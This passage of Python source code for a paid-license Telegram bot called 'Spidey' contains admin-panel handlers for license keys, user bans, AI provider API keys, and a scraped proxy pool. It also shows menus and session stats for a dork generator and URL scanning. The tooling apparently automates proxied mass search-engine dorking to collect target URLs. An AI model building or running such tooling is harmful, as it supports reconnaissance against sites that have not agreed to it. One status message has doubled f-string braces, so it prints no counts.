    elif data == "admin_listkeys":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        if not license_keys:
            await query.edit_message_text(
                "⚠️︎ Nᴏ Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ Yᴇᴛ.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            )
            return MENU
        lines = ["✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n🔑 𝘼𝙡𝙡 𝙇𝙞𝙘𝙚𝙣𝙨𝙚𝙙 𝙆𝙚𝙮𝙨\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"]
        for key, info in list(license_keys.items()):
            status = f"Used by `{info['used_by']}`" if info["used_by"] else "✅ Aᴠᴀɪʟᴀʙʟᴇ"
            lines.append(f"`{key}` — {info['emoji']} {info['label']}\n  {status}")
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:4000] + "\n_...Tʀᴜɴᴄᴀᴛᴇᴅ_"
        await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_users":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        active = {uid: info for uid, info in authorized_users.items() if datetime.now() < info["expires"]}
        if not active:
            await query.edit_message_text(
                "✿︎ Nᴏ Usᴇʀs Aʀᴇ Aᴄᴛɪᴠᴇ Rɪɢʜᴛ Nᴏᴡ.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            )
            return MENU
        lines = ["✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n📈 𝘼𝙘𝙩𝙞𝙫𝙚 𝙐𝙨𝙚𝙧𝙨\n✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"]
        for uid, info in active.items():
            remaining = info["expires"] - datetime.now()
            hrs  = int(remaining.total_seconds() // 3600)
            mins = int((remaining.total_seconds() % 3600) // 60)
            lines.append(f"🍷 `{uid}` — {info['plan']} — ⏳ `{hrs}ʜ {mins}ᴍ` left")
        await query.edit_message_text(
            "\n".join(lines),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_stats":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        total_keys   = len(license_keys)
        used_keys    = sum(1 for k in license_keys.values() if k["used_by"])
        active_users = sum(1 for info in authorized_users.values() if datetime.now() < info["expires"])
        total_user_prx = sum(len(v) for v in user_proxies.values())
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "📊︎ 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🔑 Keys generated: `{total_keys}`\n"
            f"✅︎ Keys used: `{used_keys}`\n"
            f"🍷 Keys available: `{total_keys - used_keys}`\n"
            f"🪀︎ Active users: `{active_users}`\n"
            f"❓︎ Total unique users: `{len(all_user_ids)}`\n"
            f"🚫 Banned users: `{len(banned_users)}`\n"
            f"🌊︎ Global proxies: `{len(global_proxy_pool)}`\n"
            f"🧤︎ User proxies (total): `{total_user_prx}`\n\n"
            "🕷️︎ Bᴏᴛ: Oɴʟɪɴᴇ ✅",
            reply_markup=make_admin_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_broadcast":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "📣 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙈𝙚𝙨𝙨𝙖𝙜𝙚\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"👥 Tᴏᴛᴀʟ Usᴇʀs Iɴ DB: `{len(all_user_ids)}`\n\n"
            "💡 Usᴀɢᴇ Bᴇʟᴏᴡ:\n"
            "`/broadcast <your message here>`\n",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_banlist":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        if not banned_users:
            ban_text = "_(No users banned)_"
        else:
            ban_text = "\n".join(f"• `{uid}`" for uid in sorted(banned_users))
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"🚫︎ 𝘽𝙖𝙣𝙣𝙚𝙙 𝙐𝙨𝙚𝙧𝙨 — {len(banned_users)} 𝙏𝙤𝙩𝙖𝙡\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            + ban_text +
            "\n\n"
            "• `/banuser <id>` — Bᴀɴ A Usᴇʀ\n"
            "• `/unbanuser <id>` — Uɴʙᴀɴ A Usᴇʀ",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_gproxylist":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        pool = global_proxy_pool
        if not pool:
            gproxy_text = "_(🗑️ Pᴏᴏʟ Is Eᴍᴘᴛʏ)_"
        else:
            lines = [f"`{i}.` `{_mask_proxy(px)}`" for i, px in enumerate(pool[:25], 1)]
            gproxy_text = "\n".join(lines)
            if len(pool) > 25:
                gproxy_text += f"\n_...and {len(pool) - 25} more_"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"🌊 𝙋𝙧𝙤𝙭𝙮 𝙋𝙤𝙤𝙡 — {len(pool)} 𝙏𝙤𝙩𝙖𝙡 𝙋𝙧𝙤𝙭𝙞𝙚𝙨.\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            + gproxy_text +
            "\n\n"
            "💡 Usᴀɢᴇ Cᴍᴅ's:\n"
            "`/gproxy host:port` — Aᴅᴅ Pʀᴏxʏ\n"
            "`/gproxy socks5://host:port` — Aᴅᴅ Sᴏᴄᴋs5\n"
            "`/gproxy clear` — Dᴇʟᴇᴛᴇ Aʟʟ\n"
            "`/gproxies` — Fᴜʟʟ Lɪsᴛ"
           f"Usᴇ `/setpr ...` Tᴏ Aᴅᴅ Mᴏʀᴇ | `/proxies` Tᴏ Lɪsᴛ | `/delpr` Tᴏ Dᴇʟᴇᴛᴇ Aʟʟ.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_checkproxies":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        total_global = len(global_proxy_pool)
        total_user = sum(len(v) for v in user_proxies.values())
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🚑︎ 𝙋𝙧𝙤𝙭𝙮 𝙃𝙚𝙖𝙡𝙩𝙝 𝘾𝙝𝙚𝙘𝙠\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"•🌊 Gʟᴏʙᴀʟ Pᴏᴏʟ: `{total_global}` Tᴏᴛᴀʟ Pʀᴏxɪᴇs\n"
            f"🧤 Usᴇʀ Pʀᴏxɪᴇs: `{total_user}` Tᴏᴛᴀʟ Pʀᴏxɪᴇs `{len(user_proxies)}` Usᴇʀs\n\n"
            "• Tᴏ Cʜᴇᴄᴋ Aɴᴅ Dᴇʟᴇᴛᴇ Dᴇᴀᴅ Pʀᴏxɪᴇs, Usᴇ:\n"
            "`/checkproxies` — Rᴇᴍᴏᴠᴇs Dᴇᴀᴅ Pʀᴏxɪᴇs Fʀᴏᴍ Pᴏᴏʟ\n\n",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_revokekey":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        key_lines = []
        for key, info in list(license_keys.items()):
            status = f"✿︎ Usᴇᴅ Bʏ `{info['used_by']}`" if info["used_by"] else "✅︎ Aᴠᴀɪʟᴀʙʟᴇ"
            key_lines.append(f"`{key}` — {info['emoji']} {info['label']} — {status}")
        keys_text = "\n".join(key_lines[:20]) if key_lines else "_⚠️ Nᴏ Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ Yᴇᴛ_"
        if len(key_lines) > 20:
            keys_text += f"\n_...and {len(key_lines)-20} more_"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "♻️ 𝙍𝙚𝙫𝙤𝙠𝙚 𝙆𝙚𝙮𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            + keys_text + "\n\n"
            "💡 Usᴇ Cᴏᴍᴍᴀɴᴅ : `/revokekey <KEY>`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_adduser":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🎖️︎ 𝙂𝙧𝙖𝙣𝙩 𝘼𝙘𝙘𝙚𝙨𝙨 𝘿𝙞𝙧𝙚𝙘𝙩𝙡𝙮\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Usᴇ Cᴏᴍᴍᴀɴᴅ: \n`/adduser <user_id> <plan>`\n"
            "🍷 Pʟᴀɴs: \n`1h  6h  1d  3d  5d  10d  15d  30d`\n"
            "📛 Exᴀᴍᴘʟᴇ: \n`/adduser 123456789 30d`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_banuser":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🚫 𝘽𝙖𝙣 𝙐𝙨𝙚𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "⛔ Pᴇʀᴍᴀɴᴀɴᴛʟʏ Bʟᴏᴄᴋ A Usᴇʀ Fʀᴏᴍ Usɪɴɢ Bᴏᴛ.\n\n"
            "💡 Usᴇ Cᴏᴍᴍᴀɴᴅ:\n`/banuser <user_id>`\n\n"
            f"✅ Cᴜʀʀᴇɴᴛʟʏ Bᴀɴɴᴇᴅ: `{len(banned_users)}` Usᴇʀs",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_unbanuser":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        if banned_users:
            ban_list = "\n".join(f"• `{uid}`" for uid in sorted(banned_users)[:20])
        else:
            ban_list = "_No banned users_"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔓︎ 𝙐𝙣𝙗𝙖𝙣 𝘼 𝙐𝙨𝙚𝙧.\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🚫 Cᴜʀʀᴇɴᴛʟʏ Bᴀɴɴᴇᴅ:\n" + ban_list + "\n\n"
            "💡 Usᴇ Cᴏᴍᴍᴀɴᴅ:\n`/unbanuser <user_id>`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_flushbans":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        count = len(banned_users)
        banned_users.clear()
        _save_bans()
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"♻️︎ 𝘼𝙡𝙡 𝘽𝙖𝙣𝙨 𝙁𝙡𝙪𝙨𝙝𝙚𝙙\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"✅ Rᴇᴍᴏᴠᴇᴅ `{count}` Bᴀɴ(s).\n",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_exportusers":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        lines = ["# Sᴘɪᴅᴇʏ 🕷️ Bot — All Users Export", f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ""]
        lines.append(f"❓ Tᴏᴛᴀʟ Uɴɪǫᴜᴇ Usᴇʀs: {len(all_user_ids)}")
        lines.append(f"🍷 Aᴄᴛɪᴠᴇ Lɪᴄᴇɴsᴇᴅ: {sum(1 for i in authorized_users.values() if datetime.now() < i['expires'])}")
        lines.append(f"🚫 Bᴀɴɴᴇᴅ: {len(banned_users)}")
        lines.append("")
        lines.append("=== 🍷 𝘼𝘾𝙏𝙄𝙑𝙀 𝙇𝙄𝘾𝙀𝙉𝙎𝙀𝘿 𝙐𝙎𝙀𝙍𝙎 ===")
        for uid, info in authorized_users.items():
            if datetime.now() < info["expires"]:
                rem = info["expires"] - datetime.now()
                hrs = int(rem.total_seconds() // 3600)
                lines.append(f"UID:{uid} | Plan:{info['plan']} | Expires in {hrs}h")
        lines.append("")
        lines.append("=== ✅ 𝘼𝙇𝙇 𝙆𝙉𝙊𝙒𝙉 𝙐𝙎𝙀𝙍 𝙄𝘿'𝙨 ===")
        for uid in sorted(all_user_ids):
            lines.append(str(uid))
        lines.append("")
        lines.append("===🚫 𝘽𝘼𝙉𝙉𝙀𝘿 𝙐𝙎𝙀𝙍𝙎 ===")
        for uid in sorted(banned_users):
            lines.append(str(uid))
        content = "\n".join(lines).encode("utf-8")
        ts = datetime.now().strftime("%d%m%y_%H%M")
        await query.answer("📤︎ Exᴘᴏʀᴛɪɴɢ Usᴇʀs...")
        await context.bot.send_document(
            chat_id=user_id,
            document=io.BytesIO(content),
            filename=f"loop_users_export_{ts}.txt",
            caption=f"📤 *Usᴇʀ Exᴘᴏʀᴛ*\n`{len(all_user_ids)}`🆔 Tᴏᴛᴀʟ Usᴇʀs\n`{len(authorized_users)}`🍷 Lɪᴄᴇɴsᴇᴅ",
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_clearproxies":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        count = len(global_proxy_pool)
        global_proxy_pool.clear()
        _save_proxies()
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"✅︎  𝙋𝙧𝙤𝙭𝙮 𝙋𝙤𝙤𝙡 𝘾𝙡𝙚𝙖𝙧𝙚𝙙..!\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🎯 Rᴇᴍᴏᴠᴇᴅ `{count}` Pʀᴏxɪᴇs Fʀᴏᴍ Tʜᴇ Pᴏᴏʟ.\n\n"
            "💡 Aᴅᴅ Nᴇᴡ Pʀᴏxɪᴇs Wɪᴛʜ `/gproxy host:port`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_scrapeproxy":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔄 𝙎𝙘𝙧𝙖𝙥𝙞𝙣𝙜 𝙋𝙧𝙤𝙭𝙞𝙚𝙨...\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "⏳ Fetching from all sources...",
            parse_mode=ParseMode.MARKDOWN,
        )
        _raw = await _scrape_fresh_proxies()
        if not _raw:
            await query.edit_message_text(
                "❌ No proxies fetched. Sources may be down.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            )
            return MENU
        _parsed = [_parse_proxy(p) for p in _raw if p]
        _before = len(global_proxy_pool)
        for _p in _parsed:
            if _p not in global_proxy_pool:
                global_proxy_pool.append(_p)
        _save_proxies()
        _added = len(global_proxy_pool) - _before
        await query.edit_message_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            f"⚔️ 𝙎𝙘𝙧𝙖𝙥𝙚 𝘿𝙤𝙣𝙚\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"📥 Fetched raw: `{{len(_raw):,}}`\n"
            f"➕ New added: `{{_added:,}}`\n"
            f"🌊 Pool total: `{{len(global_proxy_pool):,}}`\n\n"
            f"🔄 _Background cleaner validating dead proxies..._",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_livefeed":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        _lf = _LIVE_FEED if "_LIVE_FEED" in globals() else {}
        if not _lf:
            await query.answer("💤 No active sessions", show_alert=True)
            return MENU
        lines = [
            "⚔️━━━━━━━━━━━━━━━━━━━━⚔️",
            "👁️ *𝗟𝗜𝗩𝗘 𝗙𝗘𝗘𝗗*",
            "⚔️━━━━━━━━━━━━━━━━━━━━⚔️\n",
        ]
        for i, (sid, s) in enumerate(_lf.items(), 1):
            lines.append(
                f"*{i}. {s.get('name','?')}* (`{sid}`)\n"
                f"  {s.get('phase','?')} | `{s.get('start','?')}`\n"
                f"  Dorks: `{s.get('dorks_done',0):,}`/`{s.get('dorks_total',0):,}` "
                f"• URLs: `{s.get('urls_found',0):,}`"
            )
        lines.append("\n🔄 _Tap again to refresh_")
        await query.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="admin_livefeed")],
                [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")],
            ]),
        )
        return MENU

    elif data == "admin_dedupstats":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in globals() else 0
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔁 𝗗𝗲𝗱𝘂𝗽 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🌐 Total scanned URLs: `{_sc:,}`\n"
            f"💾 Stored in: `scanned_urls.json`\n\n"
            "All future parser runs skip\n"
            "these URLs automatically.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ Clear Dedup DB",  callback_data="admin_cleardedup")],
                [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")],
            ]),
        )
        return MENU

    elif data == "admin_cleardedup":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        _SCANNED_URLS.clear()
        _save_scanned()
        await query.edit_message_text(
            "✅ Dedup database cleared.\n"
            "All URLs will be treated as fresh.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")],
            ]),
        )
        return MENU

    elif data == "admin_serverinfo":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        import psutil, platform
        proc = psutil.Process()
        mem_mb = proc.memory_info().rss / 1024 / 1024
        cpu_pct = psutil.cpu_percent(interval=0.1)
        sys_mem = psutil.virtual_memory()
        sys_mem_used = sys_mem.used / 1024 / 1024
        sys_mem_total = sys_mem.total / 1024 / 1024
        py_ver = platform.python_version()
        active_tasks = len([t for t in asyncio.all_tasks() if not t.done()])
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "︎🛰️ 𝙎𝙚𝙧𝙫𝙚𝙧 𝙄𝙣𝙛𝙤\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🐍 Pʏᴛʜᴏɴ: `{py_ver}`\n"
            f"🕸️ Bᴏᴛ RAM: `{mem_mb:.1f} MB`\n"
            f"🖥️ Sʏsᴛᴇᴍ RAM: `{sys_mem_used:.0f} / {sys_mem_total:.0f} MB`\n"
            f"🗄️ CPU: `{cpu_pct:.1f}%`\n"
            f"🧤 Aᴄᴛɪᴠᴇ Tᴀsᴋs: `{active_tasks}`\n"
            f"✅ Kɴᴏᴡɴ Usᴇʀs: `{len(all_user_ids)}`\n"
            f"🌊 Gʟᴏʙᴀʟ Pʀᴏxɪᴇs: `{len(global_proxy_pool)}`\n"
            f"🚫 Bᴀɴɴᴇᴅ: `{len(banned_users)}`\n\n"
            f"🕷️ Bᴏᴛ: Oɴʟɪɴᴇ ✅",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ", callback_data="admin_serverinfo"),
                                                InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_aikeys":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        await query.edit_message_text(
            _ai_keys_status_text(),
            reply_markup=make_ai_keys_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data in ("setkey_anthropic", "setkey_gemini", "setkey_openrouter"):
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        prov = data.replace("setkey_", "")
        context.user_data["waiting_for_ai_key"] = prov
        _names = {
            "anthropic": "🔵 Anthropic Claude (starts with sk-ant-...)",
            "gemini": "🟢 Google Gemini (starts with AIza...)",
            "openrouter": "🟡 OpenRouter (starts with sk-or-...)",
        }
        await query.edit_message_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"✏️ 𝙎𝙚𝙩 {_names.get(prov, prov)}\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            f"Send / paste your **{prov.title()} API Key** in chat now.\n\n"
            f"❌ Send `/cancel` to abort.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_aikeys")]]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "delkey_all":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        _save_ai_key("anthropic", "")
        _save_ai_key("gemini", "")
        _save_ai_key("openrouter", "")
        await query.edit_message_text(
            "🗑️ *All AI Provider Keys Cleared!*\n\n" + _ai_keys_status_text(),
            reply_markup=make_ai_keys_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data in ("delkey_anthropic", "delkey_gemini", "delkey_openrouter"):
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        prov = data.replace("delkey_", "")
        _save_ai_key(prov, "")
        await query.edit_message_text(
            f"🗑️ *{prov.title()} Key Cleared!*\n\n" + _ai_keys_status_text(),
            reply_markup=make_ai_keys_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "admin_getfile":
        if not is_admin(user_id):
            await query.answer("❌ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ", show_alert=True)
            return MENU
        bot_dir   = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(bot_dir, "main.py")
        try:
            with open(file_path, "rb") as f:
                content = f.read()
            ts    = datetime.now().strftime("%d%m%y_%H%M")
            lines = len(content.decode("utf-8", errors="ignore").splitlines())
            size  = len(content) // 1024
            await query.answer("📤︎ Sᴇɴᴅɪɴɢ Bᴏᴛ Fɪʟᴇ...")
            await context.bot.send_document(
                chat_id=user_id,
                document=io.BytesIO(content),
                filename=f"Spidey_bot_main_{ts}.py",
                caption=(
                    f"🕷️ *Sᴘɪᴅᴇʏ Bᴏᴛ — Sᴘɪᴅᴇʏ.py*\n"
                    f"🖊️ `{lines:,}` lines — `{size} KB`\n"
                    f"⏳ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception as e:
            await query.answer(f"❌ Eʀʀᴏʀ: {e}", show_alert=True)
        return MENU

    # ── Redeem ────────────────────────────────────────────────────────────────
    elif data == "menu_redeem":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔑 𝙍𝙚𝙙𝙚𝙚𝙢 𝙔𝙤𝙪𝙧 𝙆𝙚𝙮\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Pᴀsᴛᴇ Yᴏᴜʀ Lɪᴄᴇɴsᴇ Kᴇʏ Bᴇʟᴏᴡ.\n"
            "_(Fᴏʀᴍᴀᴛ: `XXXXX-XXXXX-XXXXX-XXXXX`)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return REDEEM_WAIT_KEY

    # ── Keyword Generator ─────────────────────────────────────────────────────
    elif data == "menu_keywords":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        context.user_data["mode"] = "keywords"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔠 𝙐𝙡𝙩𝙞𝙢𝙖𝙩𝙚 𝙆𝙚𝙮𝙬𝙤𝙧𝙙 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Wɪsʜ Yᴏᴜʀ Lɪᴍɪᴛ Fᴏʀ Kᴇʏᴡᴏʀᴅs!\n",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return KW_WAIT_COUNT

    # ── Dork Generator ────────────────────────────────────────────────────────
    elif data == "menu_dorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🧤 𝙍𝙣𝙙 𝘿𝙤𝙧𝙠𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧\n"
